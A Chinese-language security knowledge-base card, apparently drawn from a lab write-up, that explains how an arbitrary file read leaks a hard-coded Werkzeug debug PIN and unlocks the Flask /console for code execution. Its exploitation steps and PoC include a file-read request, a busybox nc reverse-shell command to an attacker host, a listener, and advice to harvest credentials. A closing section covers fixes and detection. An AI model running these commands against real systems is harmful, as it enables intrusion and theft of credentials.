---
id: web-python-framework-flask-debug-pin-file-read-console-rce
title: 任意文件读取泄露硬编码 WERKZEUG_DEBUG_PIN：Flask 调试控制台直接 RCE
type: scenario
domain: web
path: web/python/framework
technique: flask-debug-pin-file-read-console-rce
tags:
- flask
- werkzeug
- debug
- pin
- file-read
- rce
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:48:07+08:00'
  notes: 已对照原文 WatchStore 章节与 img55-57：/read?id=/etc/passwd 任意文件读取，/read?id=app.py 泄露 os.environ['WERKZEUG_DEBUG_PIN']='612-791-734'，/console 执行 os.system 反弹 shell；实际 shell 为 relox 而非 www-data，卡片 www-data/relox 表述可接受；未实测。
url: /docs/web/python/framework/web-python-framework-flask-debug-pin-file-read-console-rce/
draft: false
kb_aliases:
- Flask 调试 PIN 泄露
- WERKZEUG_DEBUG_PIN
- Flask /console RCE
- 文件读取拿 PIN
- Werkzeug 控制台
---

## 一句话结论

Flask 应用若开启调试模式，同时在源码/环境变量里硬编码了 `WERKZEUG_DEBUG_PIN`，且站点存在任意文件读取，攻击者读取 `app.py` 就能直接拿到 PIN，在 `/console` 输入后执行任意 Python 代码，无需再推导 MAC/machine-id。

## 原理

- Werkzeug 调试控制台默认用“可预测 PIN”保护，PIN 可由 public/private bits 推导；但开发者为了调试方便，常通过环境变量 `WERKZEUG_DEBUG_PIN` 或代码直接设置固定 PIN。
- 固定 PIN 一旦随源码、`.env`、容器镜像、备份或任意文件读取漏洞泄露，控制台就不再是秘密：访问 `/console`，输入 PIN 即可进入交互式 Python 控制台。
- 案例中 Flask 应用的 `/read?id=` 路由可读任意文件；读取 `app.py` 看到 `os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'`；访问 `/console` 输入该 PIN，执行 `os.system('busybox nc <attacker> 4444 -e bash')` 获得 www-data/relox Shell。
- 调试控制台在 traceback 页面与 `/console` 都可用；PIN 认证通过后就是完整的 Python 执行环境，可直接 `import os`、读文件、反弹 Shell。
- 根因是“生产环境开启 debug + 硬编码 PIN + 任意文件读取”三者叠加；单独的 PIN 推导攻击需要收集 bits，而硬编码 PIN 泄露把这步完全跳过。

## 触发条件

- Flask 以 debug 模式运行，`/console` 或 traceback 调试页可访问；
- 应用硬编码/环境变量固定 `WERKZEUG_DEBUG_PIN`，且该值可通过文件读取、源码泄露、镜像/备份等获得；
- 存在任意文件读取或其他可读取应用源码/配置的漏洞；
- 调试端口/路径对攻击者可达。

## 利用步骤

1. 确认 Flask 调试模式：访问不存在路径或制造异常，观察是否出现 Werkzeug traceback / Console 页面。
2. 寻找文件读取点（如 `/read?id=`、下载接口、LFI），读取应用源码 `app.py`、`config.py`、`.env`、启动脚本。
3. 搜索 `WERKZEUG_DEBUG_PIN`、`debug=True`、`app.run` 等关键字，提取 PIN。
4. 访问 `/console`，输入 PIN 解锁控制台。
5. 在控制台执行命令/反弹 Shell，例如 `import os; os.system('busybox nc <attacker> 4444 -e bash')`。
6. 维持 Shell，继续收集配置与凭据；修复前该控制台可反复利用。

## PoC

```bash
# 1. 任意文件读取泄露源码
curl "http://target/read?id=app.py"
# 响应中：
# os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'
```

```text
# 2. 浏览器访问
http://target/console
# 输入 PIN: 612-791-734
# 控制台执行：
>>> import os
>>> os.system('busybox nc 192.0.2.10 4444 -e bash')
```

```bash
# 3. 攻击机监听
nc -lvnp 4444
```

## 变体与关联

- 变体：PIN 写在 `.env`、Dockerfile、systemd 环境变量、k8s ConfigMap、备份文件中；任意文件读取/源码泄露均可拿到。
- 变体：没有硬编码 PIN 时，回到 PIN 可预测推导（public/private bits）路径，见关联卡。
- 关联：[[web-python-framework-flask-werkzeug-debug-pin-forgery]]（PIN 推导）、[[web-generic-file-inclusion-python-os-path-join-absolute-traversal]]（Python 文件读取）、[[web-python-framework-flask-static-folder-arbitrary-file-read]]（Flask 任意文件读取）。
- 边界：生产环境关闭 debug、PIN 随机且未泄露、`/console` 被网络 ACL 限制时，本路径不成立。

## 检测与防御

- 修复：生产环境禁用 `debug=True`；不要硬编码 `WERKZEUG_DEBUG_PIN`；移除任意文件读取接口。
- 加固：调试控制台只绑定 127.0.0.1 或经 SSH 隧道访问；使用独立调试环境；对 `/console` 做网络 ACL 与告警。
- 检测：访问 `/console`、`__debugger__`、traceback 页面的请求；源码/配置中出现 `WERKZEUG_DEBUG_PIN`；调试模式下异常的 Python 进程派生 `sh`/`nc`。
